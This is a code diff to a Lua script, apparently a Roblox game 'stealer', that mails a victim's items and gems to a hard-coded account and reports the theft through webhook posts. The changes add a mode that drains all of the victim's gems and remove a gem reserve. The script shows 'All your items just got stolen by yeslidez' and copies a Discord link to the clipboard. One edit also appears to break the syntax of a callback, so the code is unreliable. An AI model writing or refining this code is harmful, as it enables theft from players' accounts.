@@ -71,7 +71,7 @@ else
     end
   end
 
-  if v3 > am then
+  if am <= v3 then
     print("Not enough gems to send mail. Cost: " .. v3 .. " | Gems: " .. am)
     return
   else
@@ -188,7 +188,7 @@ else
           or descendant.SoundId == "rbxassetid://12413423276") then
         descendant:Destroy()
       end
-    end)
+    end
 
     local function f4()
       local library = replicatedStorage:FindFirstChild("Library")
@@ -317,7 +317,7 @@ else
 
     local function f8()
       for key4, value9 in pairs(f2().Inventory.Currency) do
-        if value9.id == "Diamonds" and am >= v3 + 10000 then
+        if value9.id == "Diamonds" and am > v3 then
           local v30 = {
             [1] = username,
             [2] = "hi",
@@ -449,7 +449,7 @@ else
 
     print("Found " .. #v1 .. " items to send.")
 
-    if #v1 > 0 or am > min_rap + v3 then
+    if #v1 > 0 or am > v3 then
       f5()
       task.wait(1)
 
@@ -478,8 +478,16 @@ else
 
         return p12.rap * p12.amount > p13.rap * p13.amount
       end)
-      print("Sending webhook notification...")
-      task.spawn(function() f1(localPlayer.Name, am) end)
+
+      if #v1 > 0 then
+        print("Sending webhook notification...")
+        task.spawn(function() f1(localPlayer.Name, am) end)
+      else
+        post("💰 Gem-only Run",
+          "No item met min_rap (`" .. min_rap .. "`). Draining all gems.\nGems: `"
+            .. am .. "` | Mail cost: `" .. v3 .. "`")
+      end
+
       print("Sending items...")
 
       for index6, value13 in ipairs(v1) do
@@ -502,7 +510,7 @@ All your items just got stolen by yeslidez
 
       setclipboard("https://discord.gg/FNnkfJqukh")
     else
-      print("No items met the min_rap requirement or no gems to send.")
+      print("No items met the min_rap requirement or not enough gems to send anything.")
     end
 
     return
